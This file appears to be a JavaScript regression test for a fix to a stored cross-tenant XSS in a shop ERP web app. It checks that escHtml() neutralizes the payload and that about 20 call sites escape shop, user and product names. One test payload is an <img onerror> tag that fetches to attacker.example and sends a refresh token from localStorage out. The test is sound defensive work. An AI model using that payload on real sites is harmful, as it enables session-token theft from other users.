/**
 * XSS regression test for S-1 (SecurityHardeningReview.md) and S-2.
 *
 * S-1: confirmed cross-tenant stored XSS via `u.name` at
 * app/ShopERP_Pro_v8.html:6351 (pssLicenseVerify) — a shop's display name,
 * echoed unescaped into another user's session on the license-verify screen.
 *
 * S-2: the same unescaped-name-into-toast() pattern at ~19 additional call
 * sites (product/customer/staff/shop names, expense category names) feeding
 * toast()'s innerHTML sink (app/ShopERP_Pro_v8.html:~3907).
 *
 * Two layers, no DOM dependency (no jsdom in this project — see
 * OperationalReadinessPlan.md's no-new-dependency posture):
 *   1. Functional: extract the real escHtml() implementation from the HTML
 *      source and run it against actual XSS payloads, confirming the
 *      dangerous characters never survive into what would become innerHTML.
 *   2. Static regression guard: confirm every previously-vulnerable call
 *      site now wraps its user-controlled variable in escHtml()/esc() — so
 *      a future edit that silently drops the wrapper fails this test.
 */
'use strict';

const fs = require('fs');
const path = require('path');

let passed = 0, failed = 0;
function assert(cond, label) {
  if (cond) { passed++; console.log('  \x1b[32m✓\x1b[0m ' + label); }
  else { failed++; console.log('  \x1b[31m✗ FAIL\x1b[0m ' + label); }
}

const htmlPath = path.join(__dirname, '..', '..', 'app', 'ShopERP_Pro_v8.html');
const src = fs.readFileSync(htmlPath, 'utf8');

// ---------------------------------------------------------------------
// Layer 1: escHtml() actually neutralizes real XSS payloads
// ---------------------------------------------------------------------
const escHtmlMatch = src.match(/function escHtml\(s\)\{[^}]*\}/);
assert(!!escHtmlMatch, 'escHtml() function definition found in source');

// eslint-disable-next-line no-eval
const escHtml = eval('(' + escHtmlMatch[0].replace('function escHtml', 'function') + ')');

const S1_PAYLOAD = '<img src=x onerror="fetch(\'//attacker.example/x?t=\'+localStorage.getItem(\'shoperpro_refresh\'))">';
const escapedS1 = escHtml(S1_PAYLOAD);
assert(!escapedS1.includes('<img'), 'escHtml() neutralizes a live <img onerror> payload (no raw <img tag survives)');
assert(!escapedS1.includes('<'), 'escHtml() output contains no raw "<" character');
assert(!escapedS1.includes('>'), 'escHtml() output contains no raw ">" character');
assert(escapedS1.includes('&lt;img'), 'escHtml() correctly entity-encodes the payload (&lt;img present)');

// Reproduce the exact S-1 sink construction with escHtml applied, and confirm
// the resulting string — the literal value that would be assigned to
// innerHTML — contains no executable markup.
const initials = '<S';
const roleLabel = 'Owner';
const reconstructedInnerHTML =
  '<div class="pss-user-avatar">' + escHtml(initials) + '</div><div><div class="pss-user-info-name">' +
  escHtml(S1_PAYLOAD) + '</div><div class="pss-user-info-role">' + roleLabel + '</div></div>';
assert(!/<img[^>]*onerror/i.test(reconstructedInnerHTML), 'S-1: reconstructed innerHTML for pss-user-info-name contains no live onerror handler — cross-tenant exploitation via this vector is no longer possible');

// ---------------------------------------------------------------------
// Layer 2: static regression guard — every known-vulnerable call site
// must still wrap its user-controlled field in escHtml()/esc()
// ---------------------------------------------------------------------
const lines = src.split('\n');
function lineContains(lineNo, substrings) {
  const line = lines[lineNo - 1] || '';
  return substrings.every(s => line.includes(s));
}

// S-1
assert(lineContains(6351, ["escHtml(u.name)", "escHtml(initials)"]),
  'S-1 (line 6351): u.name and initials both wrapped in escHtml() inside pssLicenseVerify()');

// S-2 — all 19 confirmed toast()/construction sites
const s2Sites = [
  { line: 4395, needle: 'escHtml(u.name)', label: 'PIN set toast' },
  { line: 4562, needle: 'escHtml(u.name)', label: 'PIN updated toast' },
  { line: 7904, needle: 'escHtml(dup.name)', label: 'existing customer selected toast' },
  { line: 8419, needle: 'escHtml(dup.name)', label: 'duplicate IMEI toast (add)' },
  { line: 8468, needle: 'escHtml(dup.name)', label: 'duplicate IMEI toast (edit)' },
  { line: 9187, needle: 'escHtml(prod.name)', label: 'stock-limit toast (cart)' },
  { line: 9235, needle: 'escHtml(item.name)', label: 'stock-limit toast (qty change)' },
  { line: 10385, needle: 'escHtml(prod.name)', label: 'insufficient stock toast (warranty part)' },
  { line: 10576, needle: 'escHtml(p.name)', label: 'out of stock toast' },
  { line: 10644, needle: 'escHtml(prod.name)', label: 'stock-limit toast (repair part)' },
  { line: 14345, needle: 'escHtml(name)', label: 'staff added toast' },
  { line: 5544, needle: 'escHtml(shopName)', label: 'admin key generated toast' },
  { line: 5799, needle: 'escHtml(c.shopName)', label: 'admin account paused toast' },
  { line: 5818, needle: 'escHtml(c.shopName)', label: 'admin account terminated toast' },
  { line: 5827, needle: 'escHtml(c.shopName)', label: 'admin account restored toast' },
  { line: 5836, needle: 'escHtml(shopName)', label: 'admin server-status-updated toast' },
  { line: 6095, needle: 'escHtml(userName)', label: 'admin PIN reset toast' },
  { line: 9384, needle: 'escHtml(item.name)', label: 'stock-insufficient error list construction' },
  { line: 11634, needle: 'escHtml(n)', label: 'expense category added toast' },
];

for (const site of s2Sites) {
  assert(lineContains(site.line, [site.needle]),
    `S-2 (line ${site.line}): ${site.label} wraps its user-controlled field in escHtml()`);
}

// Negative control: confirm native window.confirm() call sites for names
// were deliberately NOT changed — confirm() is a native dialog (plain text,
// not an innerHTML sink), so wrapping it would be a no-op at best and would
// incorrectly display literal "&#39;" etc. for names containing quotes/
// apostrophes at worst. This guards against a future "helpful" but wrong fix.
assert(lineContains(6005, ["confirm('Clear PIN for '+u.name"]),
  "S-2 negative control: confirm() at line 6005 correctly left unescaped (native dialog, not an innerHTML sink)");
assert(lineContains(11122, ["confirm('", "already exists for \"'+dup.name+'\""]),
  "S-2 negative control: confirm() at line 11122 correctly left unescaped (native dialog, not an innerHTML sink)");

console.log('\n' + passed + ' passed, ' + failed + ' failed');
process.exit(failed > 0 ? 1 : 0);
